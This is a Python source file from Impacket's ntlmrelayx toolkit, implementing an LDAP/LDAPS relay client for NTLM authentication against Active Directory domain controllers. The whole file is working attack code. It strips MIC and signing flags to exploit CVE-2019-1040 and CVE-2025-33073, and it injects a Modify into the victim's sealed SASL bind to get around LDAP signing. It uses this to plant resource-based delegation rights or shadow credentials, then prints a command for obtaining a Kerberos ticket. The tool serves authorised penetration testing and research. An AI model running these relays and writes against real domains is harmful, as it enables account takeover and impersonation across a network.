# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   LDAP Protocol Client
#   LDAP client for relaying NTLMSSP authentication to LDAP servers
#   The way of using the ldap3 library is quite hacky, but its the best
#   way to make the lib do things it wasn't designed to without touching
#   its code
#
# Author:
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#   Alberto Solino (@agsolino)
#
import sys
import random
import string
import time
from struct import pack, unpack
from impacket import LOG
from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD
from ldap3.operation import bind
from ldap3.utils.conv import escape_filter_chars
try:
    from ldap3.core.results import RESULT_SUCCESS, RESULT_STRONGER_AUTH_REQUIRED
except ImportError:
    LOG.fatal("ntlmrelayx requires ldap3 > 2.0. To update, use: 'python -m pip install ldap3 --upgrade'")
    sys.exit(1)

from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.examples.ntlmrelayx.utils import shadow_credentials
from impacket.ldap import ldaptypes
from impacket.ldap.ldap import LDAPConnection, LDAPSessionError, get_entry_values
from impacket.ldap.ldapasn1 import BindRequest, LDAPMessage, ModifyRequest, Operation, ResultCode, Scope
from impacket.nmb import NetBIOSError
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import (
    NTLMAuthChallenge,
    NTLMSSP_AV_FLAGS,
    AV_PAIRS,
    NTLMAuthNegotiate,
    NTLMSSP_NEGOTIATE_SIGN,
    NTLMSSP_NEGOTIATE_SEAL,
    NTLMSSP_NEGOTIATE_ALWAYS_SIGN,
    NTLMAuthChallengeResponse,
    NTLMSSP_NEGOTIATE_KEY_EXCH,
    NTLMSSP_NEGOTIATE_UNICODE,
    NTLMSSP_NEGOTIATE_VERSION)
from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
from pyasn1.codec.ber import decoder, encoder
from pyasn1.error import PyAsn1Error

PROTOCOL_CLIENT_CLASSES = ["LDAPRelayClient", "LDAPSRelayClient"]

class LDAPRelayClientException(Exception):
    pass

class LDAPRelayClient(ProtocolClient):
    PLUGIN_NAME = "LDAP"
    MODIFY_ADD = MODIFY_ADD

    def __init__(self, serverConfig, target, targetPort = 389, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None
        self.bypassConnection = None
        self.baseDN = None
        self.targetDN = None
        self.targetSam = None
        self.shadowKeyCert = None
        self.confirmValue = None

    def killConnection(self):
        if self.bypassConnection is not None:
            try:
                self.bypassConnection.close()
            except (LDAPSessionError, NetBIOSError, OSError) as e:
                LOG.debug('LDAP signing bypass: closing the base session failed: %s' % e)
            self.bypassConnection = None
            self.session = None
            return
        if self.session is not None:
            self.session.socket.close()
            self.session = None

    def initConnection(self):
        if self.serverConfig.reauth_bypass:
            return self.bypassInitConnection()
        self.server = Server("ldap://%s:%s" % (self.targetHost, self.targetPort), get_info=ALL)
        self.session = Connection(self.server, user="a", password="b", authentication=NTLM)
        self.session.open(False)
        return True

    def sendNegotiate(self, negotiateMessage):
        if self.serverConfig.reauth_bypass:
            return self.bypassSendNegotiate(negotiateMessage)
        negoMessage = NTLMAuthNegotiate()
        negoMessage.fromString(negotiateMessage)

        # When exploiting CVE-2019-1040, remove message signing flag
        # For SMB->LDAP this is required otherwise it triggers LDAP signing
        # Changing flags breaks the signature unless the client uses a non-standard implementation of NTLM
        # CVE-2025-33073 also requires removing the sign flags
        if self.serverConfig.remove_mic or self.serverConfig.remove_sign_seal:
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN

        # When exploiting CVE-2025-33073, remove SEAL in addition to SIGN/ALWAYS_SIGN.
        if self.serverConfig.remove_sign_seal:
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL

        self.negotiateMessage = negoMessage.getData()

        # Warn if the relayed target requests signing, which will break our attack
        if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
            LOG.warning('The client requested signing. Relaying to LDAP will not work! (This usually happens when relaying from SMB to LDAP)')

        with self.session.connection_lock:
            if not self.session.sasl_in_progress:
                self.session.sasl_in_progress = True
                request = bind.bind_operation(self.session.version, 'SICILY_PACKAGE_DISCOVERY')
                response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
                result = response[0]
                try:
                    sicily_packages = result['server_creds'].decode('ascii').split(';')
                except KeyError:
                    raise LDAPRelayClientException('Could not discover authentication methods, server replied: %s' % result)

                if 'NTLM' in sicily_packages:  # NTLM available on server
                    request = bind.bind_operation(self.session.version, 'SICILY_NEGOTIATE_NTLM', self)
                    response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
                    result = response[0]
                    if result['result'] == RESULT_SUCCESS:
                        challenge = NTLMAuthChallenge()
                        challenge.fromString(result['server_creds'])
                        self.sessionData['CHALLENGE_MESSAGE'] = challenge
                        return challenge
                else:
                    raise LDAPRelayClientException('Server did not offer NTLM authentication!')

    #This is a fake function for ldap3 which wants an NTLM client with specific methods
    def create_negotiate_message(self):
        return self.negotiateMessage

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if self.serverConfig.reauth_bypass:
            return self.bypassSendAuth(authenticateMessageBlob)
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            if respToken2.isNegoExSelected():
                LOG.info("Target selected NEGOEX/PKU2U authentication, relay currently not supported for this mechanism")
                raise Exception("NEGOEX/PKU2U relay is not supported")
            token = respToken2['ResponseToken']
        else:
            token = authenticateMessageBlob

        authMessage = NTLMAuthChallengeResponse()
        authMessage.fromString(token)
        # When exploiting CVE-2019-1040, remove flags
        if self.serverConfig.remove_mic:
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
            authMessage['MIC'] = b''
            authMessage['MICLen'] = 0
            authMessage['Version'] = b''
            authMessage['VersionLen'] = 0
            token = authMessage.getData()

        if self.serverConfig.remove_sign_seal:
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
            token = authMessage.getData()

        with self.session.connection_lock:
            self.authenticateMessageBlob = token
            request = bind.bind_operation(self.session.version, 'SICILY_RESPONSE_NTLM', self, None)
            response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))
            result = response[0]
        self.session.sasl_in_progress = False

        if result['result'] == RESULT_SUCCESS:
            self.session.bound = True
            self.session.refresh_server_info()
            return None, STATUS_SUCCESS
        else:
            if result['result'] == RESULT_STRONGER_AUTH_REQUIRED and self.PLUGIN_NAME != 'LDAPS':
                raise LDAPRelayClientException('Server rejected authentication because LDAP signing is enabled. Try connecting with TLS enabled (specify target as ldaps://hostname )')
        return None, STATUS_ACCESS_DENIED

    #This is a fake function for ldap3 which wants an NTLM client with specific methods
    def create_authenticate_message(self):
        return self.authenticateMessageBlob

    #Placeholder function for ldap3
    def parse_challenge_message(self, message):
        pass

    def keepAlive(self):
        if self.serverConfig.reauth_bypass:
            # The bypass does its single operation in sendAuth and then tears down
            return
        # Basic LDAP query to keep the connection alive
        self.session.search(search_base='',
            search_filter='(objectClass=*)',
            search_scope='BASE',
            attributes=['namingContexts'])

    # LDAP signing bypass: the relayed bind and one write share a SASL record sealed with our key, so the DC runs the write as the victim; single-shot since the seal key becomes the victim's afterwards
    SUPPORTED_BYPASS_ATTACKS = ('--delegate-access', '--shadow-credentials')

    def bypassSelectedAttack(self):
        # Reuse the existing LDAP attack options; exactly one write attack must be selected
        selected = []
        if self.serverConfig.delegateaccess:
            selected.append('rbcd')
        if self.serverConfig.IsShadowCredentialsAttack:
            selected.append('shadow')
        return selected[0] if len(selected) == 1 else None

    def bypassBuildWrite(self):
        # (attribute, [values], operation) of the ModifyRequest executed as the relayed victim
        if self.bypassSelectedAttack() == 'rbcd':
            return self.bypassRbcdWrite()
        return self.bypassShadowWrite()

    def bypassRbcdWrite(self):
        # Grant RBCD on the victim's own object to the account we control, appending to any existing ACEs
        # Imported here only: ldapattack pulls ldapdomaindump and dnspython into the client's import path
        from impacket.examples.ntlmrelayx.attacks.ldapattack import create_allow_ace, create_empty_sd
        if not self.serverConfig.escalateuser:
            raise LDAPRelayClientException('--delegate-access needs --escalate-user (an account) or --escalate-user <SID> with --sid')
        if self.serverConfig.sid:
            escalate_sid = self.serverConfig.escalateuser
        else:
            escalate_sid = self.bypassResolveSid(self.serverConfig.escalateuser)
            if not escalate_sid:
                raise LDAPRelayClientException('could not resolve --escalate-user %s to a SID' % self.serverConfig.escalateuser)

        existing = self.bypassReadAttribute(self.targetDN, 'msDS-AllowedToActOnBehalfOfOtherIdentity')
        if existing:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=existing[0])
            LOG.debug('Currently allowed sids:')
            for ace in sd['Dacl'].aces:
                LOG.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
        else:
            sd = create_empty_sd()
        sd['Dacl'].aces.append(create_allow_ace(escalate_sid))
        self.confirmValue = sd.getData()
        return 'msDS-AllowedToActOnBehalfOfOtherIdentity', [sd.getData()], Operation('replace')

    def bypassShadowWrite(self):
        # Mirror the classic attack: read current KeyCredentials as our account, then REPLACE with the new set
        LOG.info("Generating certificate")
        key, certificate = shadow_credentials.createSelfSignedX509Certificate(subject=self.targetSam)
        LOG.info("Certificate generated")
        LOG.info("Generating KeyCredential")
        keyCredential = shadow_credentials.KeyCredential(key, deviceId=shadow_credentials.getDeviceId(),
                                                         currentTime=shadow_credentials.getTicksNow())
        ours = shadow_credentials.toDNWithBinary2String(keyCredential.dumpBinary(), self.targetDN).encode('utf-8')

        existing = self.bypassReadAttribute(self.targetDN, 'msDS-KeyCredentialLink')
        LOG.info('Found %d existing KeyCredential(s) on target object' % len(existing))
        if self.serverConfig.ShadowCredentialsReplace:
            if existing:
                count, backup_path = shadow_credentials.backupKeyCredentialsToJSON(
                    self.targetSam, existing, self.serverConfig.ShadowCredentialsBackupPath)
                LOG.info('Exported %d existing KeyCredential(s) to %s' % (count, backup_path))
            new_values = [ours]
        else:
            # A machine account may only hold one self-added key, so --shadow-replace is often required
            new_values = existing + [ours]
        # Export only once the DC accepts the write, so a refused Modify leaves no misleading PFX
        self.shadowKeyCert = (key, certificate)
        self.confirmValue = ours
        return 'msDS-KeyCredentialLink', new_values, Operation('replace')

    def bypassAnnounceSuccess(self):
        # Post-write messages mirroring the classic attacks, printed only once the Modify is accepted
        if self.serverConfig.delegateaccess:
            LOG.info('Delegation rights modified succesfully!')
            LOG.info('%s can now impersonate users on %s via S4U2Proxy', self.serverConfig.escalateuser, self.targetSam)
        elif self.shadowKeyCert is not None:
            self.bypassSaveShadowCredential()

    def bypassSaveShadowCredential(self):
        key, certificate = self.shadowKeyCert
        if self.serverConfig.ShadowCredentialsOutfilePath is None:
            path = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
            LOG.debug("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
        else:
            path = self.serverConfig.ShadowCredentialsOutfilePath
        domain = '.'.join([part.split('=', 1)[1] for part in self.baseDN.split(',') if part.lower().startswith('dc=')])

        if self.serverConfig.ShadowCredentialsExportType == "PEM":
            shadow_credentials.exportPEM(certificate, key, path_to_files=path)
            LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
            LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
            LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
            LOG.info("Run the following command to obtain a TGT")
            LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, self.targetSam, path))
        else:
            if self.serverConfig.ShadowCredentialsPFXPassword is None:
                password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20))
                LOG.debug("No pass was provided. The certificate will be store with the password: %s" % password)
            else:
                password = self.serverConfig.ShadowCredentialsPFXPassword
            shadow_credentials.exportPFX(certificate, key, password=password, path_to_file=path)
            LOG.info("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
            LOG.info("Must be used with password: %s" % password)
            LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
            LOG.info("Run the following command to obtain a TGT")
            LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, self.targetSam, path))

    def bypassOpenSession(self):
        # A signed LDAP session as our own account, used for the base session and the read-back
        connection = LDAPConnection('ldap://%s' % self.targetHost, dstIp=self.targetHost, signing=True, timeout=10)
        connection.login(self.serverConfig.reauth_user, self.serverConfig.reauth_password,
                         self.serverConfig.reauth_domain, self.serverConfig.reauth_lmhash,
                         self.serverConfig.reauth_nthash, authenticationChoice='sasl')
        return connection

    def bypassResolveBaseDN(self):
        entries = self.bypassConnection.search(searchBase='', scope=Scope('baseObject'),
                                               searchFilter='(objectClass=*)',
                                               attributes=['defaultNamingContext'])
        for entry in entries:
            values = get_entry_values(entry, 'defaultNamingContext')
            if values:
                return bytes(values[0]).decode('utf-8')
        raise LDAPRelayClientException('could not read defaultNamingContext from the DC')

    def bypassLookup(self, samaccountname, attributes):
        try:
            entries = self.bypassConnection.search(searchBase=self.baseDN, scope=Scope('wholeSubtree'),
                                                   searchFilter='(sAMAccountName=%s)' % escape_filter_chars(samaccountname),
                                                   attributes=attributes)
        except LDAPSessionError as e:
            # An anonymous base session cannot search; the caller must supply the target as a DN
            LOG.debug('LDAP signing bypass: lookup of %s failed: %s' % (samaccountname, e))
            return None
        for entry in entries:
            return entry
        return None

    def bypassResolveSid(self, samaccountname):
        entry = self.bypassLookup(samaccountname, ['objectSid'])
        values = get_entry_values(entry, 'objectSid') if entry else None
        if not values:
            return None
        return ldaptypes.LDAP_SID(data=bytes(values[0])).formatCanonical()

    def bypassReadAttribute(self, dn, attribute):
        try:
            entries = self.bypassConnection.search(searchBase=dn, scope=Scope('baseObject'),
                                                   searchFilter='(objectClass=*)', attributes=[attribute])
        except LDAPSessionError as e:
            # Our base session cannot read the current value (e.g. anonymous); existing values will be overwritten
            LOG.warning('LDAP signing bypass: could not read current %s, writing blind (existing values will be replaced): %s' % (attribute, e))
            return []
        for entry in entries:
            values = get_entry_values(entry, attribute)
            if values:
                return [bytes(raw) for raw in values]
        return []

    @staticmethod
    def victimName(authMessage):
        # DOMAIN\user carried in the relayed NTLM authenticate message
        encoding = 'utf-16le' if authMessage['flags'] & NTLMSSP_NEGOTIATE_UNICODE else 'ascii'
        return '%s\\%s' % (authMessage['domain_name'].decode(encoding), authMessage['user_name'].decode(encoding))

    @staticmethod
    def victimSam(authMessage):
        encoding = 'utf-16le' if authMessage['flags'] & NTLMSSP_NEGOTIATE_UNICODE else 'ascii'
        return authMessage['user_name'].decode(encoding)

    @staticmethod
    def ldapMessage(operation, messageID):
        message = LDAPMessage()
        message['messageID'] = messageID
        message['protocolOp'].setComponentByType(operation.getTagSet(), operation)
        return encoder.encode(message)

    @staticmethod
    def saslBindRequest(token):
        # Wrap a raw SPNEGO token in a GSS-SPNEGO SASL BindRequest
        request = BindRequest()
        request['version'] = 3
        request['name'] = ''
        request['authentication']['sasl']['mechanism'] = 'GSS-SPNEGO'
        request['authentication']['sasl']['credentials'] = token
        return request

    def modifyRequest(self, attribute, values, operation):
        request = ModifyRequest()
        request['object'] = self.targetDN
        request['changes'][0]['operation'] = operation
        request['changes'][0]['modification']['type'] = attribute
        request['changes'][0]['modification']['vals'].setComponents(*values)
        return request

    def bypassInitConnection(self):
        if self.PLUGIN_NAME == 'LDAPS':
            LOG.error('The LDAP signing bypass targets ldap:// (SASL signing); use an ldap:// target, not ldaps://')
            return False
        if self.serverConfig.runSocks or self.serverConfig.interactive:
            # The seal key becomes the victim's after the bind, so nothing can be driven afterwards
            LOG.error('The LDAP signing bypass is single-shot; -i and -socks are not supported')
            return False
        if self.bypassSelectedAttack() is None:
            LOG.error('The LDAP signing bypass needs exactly one write attack among %s' %
                      ', '.join(self.SUPPORTED_BYPASS_ATTACKS))
            return False

        # Our own signed LDAP session, whose SASL key we own and sign the injected record with
        try:
            self.bypassConnection = self.bypassOpenSession()
            self.baseDN = self.bypassResolveBaseDN()
        except (LDAPSessionError, LDAPRelayClientException, NetBIOSError, OSError) as e:
            LOG.error('LDAP signing bypass: could not open the base session as %s\\%s: %s' % (
                self.serverConfig.reauth_domain, self.serverConfig.reauth_user, e))
            self.killConnection()
            return False

        self.session = self.bypassConnection
        identity = 'anonymous' if self.serverConfig.reauth_anonymous else '%s\\%s' % (
            self.serverConfig.reauth_domain, self.serverConfig.reauth_user)
        LOG.info('LDAP signing bypass: base session opened as %s' % identity)
        return True

    def bypassSendNegotiate(self, negotiateMessage):
        # Forward the victim's NTLM Type 1 in a GSS-SPNEGO bind and return the DC's challenge
        type1 = NTLMAuthNegotiate()
        type1.fromString(negotiateMessage)
        blob = SPNEGO_NegTokenInit()
        blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
        blob['MechToken'] = type1.getData()

        answer = self.bypassConnection.sendReceive(self.saslBindRequest(blob.getData()))
        result = answer[0]['protocolOp']['bindResponse']
        if result['resultCode'] != ResultCode('saslBindInProgress'):
            raise LDAPRelayClientException('LDAP signing bypass: GSS-SPNEGO Type 1 rejected: %s' %
                                           result['resultCode'].prettyPrint())
        target_spnego = SPNEGO_NegTokenResp(result['serverSaslCreds'].asOctets())
        challenge = NTLMAuthChallenge()
        challenge.fromString(target_spnego['ResponseToken'])
        self.sessionData['CHALLENGE_MESSAGE'] = challenge
        return challenge

    def bypassSendAuth(self, authenticateMessageBlob):
        token = authenticateMessageBlob
        if unpack('B', token[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            token = SPNEGO_NegTokenResp(token)['ResponseToken']

        authMessage = NTLMAuthChallengeResponse()
        authMessage.fromString(token)
        victim = self.victimName(authMessage)

        # Target the relayed principal, or the --shadow-target / --delegate-target object (a full DN skips the lookup, so an anonymous base session needs no read)
        target = self.victimSam(authMessage)
        if self.serverConfig.IsShadowCredentialsAttack and self.serverConfig.ShadowCredentialsTarget:
            target = self.serverConfig.ShadowCredentialsTarget
        elif self.serverConfig.delegateaccess and self.serverConfig.delegatetarget:
            target = self.serverConfig.delegatetarget

        try:
            if '=' in target:
                self.targetDN = target
                self.targetSam = target.split(',')[0].split('=', 1)[-1]
            else:
                sam = target.split('/')[-1].split('\\')[-1]
                entry = self.bypassLookup(sam, ['distinguishedName'])
                if entry is None:
                    LOG.error('LDAP signing bypass: could not resolve %s in the directory '
                              '(an anonymous base session cannot search; pass the target as a full DN via --shadow-target or --delegate-target)', sam)
                    return None, STATUS_ACCESS_DENIED
                self.targetDN = str(entry['objectName'])
                self.targetSam = sam
            attribute, values, operation = self.bypassBuildWrite()
        except (LDAPRelayClientException, LDAPSessionError, NetBIOSError, OSError) as e:
            LOG.error('LDAP signing bypass: %s', e)
            return None, STATUS_ACCESS_DENIED

        final = SPNEGO_NegTokenResp()
        final['ResponseToken'] = token
        # Forward the victim's mechListMIC when present (SPNEGO [3] OCTET STRING, 16 bytes)
        if len(authenticateMessageBlob) >= 20 and authenticateMessageBlob[-20:-16] == b'\xa3\x12\x04\x10':
            final['mechListMIC'] = authenticateMessageBlob[-16:]

        bind_message = self.ldapMessage(self.saslBindRequest(final.getData()), 1)
        modify_message = self.ldapMessage(self.modifyRequest(attribute, values, operation), 2)

        # Both messages, sealed as one SASL record under our own key: the crux of the bypass
        record = self.bypassConnection.encrypt(bind_message + modify_message)
        self.bypassConnection._socket.sendall(record)
        LOG.info('LDAP signing bypass: same-record frame sent, victim %s writing %s on %s' % (
            victim, attribute, self.targetDN))

        modify_accepted = self.readInRecordResponses()
        if self.verifyWrite(attribute, self.confirmValue) or modify_accepted:
            self.bypassAnnounceSuccess()
        # Fail the relayed SMB/coercion leg; its own tooling may still print FAILED
        return None, STATUS_ACCESS_DENIED

    def readInRecordResponses(self):
        # Whether the injected Modify was accepted, when the DC answers it under the key we still hold
        modify_ok = False
        for label in ('Bind', 'Modify'):
            try:
                length = unpack('>I', self.recvExact(4))[0]
                plaintext = self.bypassConnection.decrypt(pack('>I', length) + self.recvExact(length))
                message, _ = decoder.decode(plaintext, asn1Spec=LDAPMessage())
                result = message['protocolOp'].getComponent()
            except (LDAPSessionError, NetBIOSError, OSError, PyAsn1Error, EOFError) as e:
                # An unreadable record desynchronizes the stream, so nothing after it can be parsed either
                LOG.info('LDAP signing bypass: %s answer unreadable (%s), relying on the read-back' % (label, e))
                break
            LOG.info('LDAP signing bypass: %s -> %s %s' % (label, result['resultCode'].prettyPrint(),
                     bytes(result['diagnosticMessage']).decode(errors='replace')[:80]))
            if label == 'Modify' and result['resultCode'] == ResultCode('success'):
                modify_ok = True
        return modify_ok

    def recvExact(self, length):
        value = b''
        while len(value) < length:
            chunk = self.bypassConnection._socket.recv(length - len(value))
            if not chunk:
                raise EOFError('connection closed while reading the LDAP response')
            value += chunk
        return value

    def verifyWrite(self, attribute, value):
        # Independent signed read-back: the DC may answer the injected Modify under the victim's seal key
        time.sleep(1)  # give the DC time to apply the Modify, whose result we cannot always read
        check = None
        try:
            check = self.bypassOpenSession()
            entries = check.search(searchBase=self.targetDN, scope=Scope('baseObject'),
                                   searchFilter='(objectClass=*)', attributes=[attribute])
        except (LDAPSessionError, NetBIOSError, OSError) as e:
            # The Modify result above is authoritative; read-back is only a convenience (it needs a readable session)
            LOG.info('LDAP signing bypass: read-back verification unavailable: %s' % e)
            return False
        finally:
            if check is not None:
                check.close()

        found = []
        for entry in entries:
            values = get_entry_values(entry, attribute)
            if values:
                found.extend(bytes(raw) for raw in values)
        if self.writeConfirmed(value, found):
            LOG.info('LDAP signing bypass: read-back confirms the target now holds our value')
            return True
        LOG.info('LDAP signing bypass: read-back does not show our value on %s' % self.targetDN)
        return False

    @staticmethod
    def writeConfirmed(value, found):
        if value in found:
            return True
        if value.startswith(b'B:'):
            # DN-Binary (msDS-KeyCredentialLink): the DC canonicalizes the trailing DN and may upper-case the hex, so match B:<len>:<hex> case-insensitively
            marker = b':'.join(value.split(b':', 3)[:3]).lower()
            return any(stored.lower().startswith(marker) for stored in found)
        return False

class LDAPSRelayClient(LDAPRelayClient):
    PLUGIN_NAME = "LDAPS"
    MODIFY_ADD = MODIFY_ADD

    def __init__(self, serverConfig, target, targetPort = 636, extendedSecurity=True ):
        LDAPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self):
        if self.serverConfig.reauth_bypass:
            return self.bypassInitConnection()
        self.server = Server("ldaps://%s:%s" % (self.targetHost, self.targetPort), get_info=ALL)
        self.session = Connection(self.server, user="a", password="b", authentication=NTLM)
        self.session.open(False)
        return True
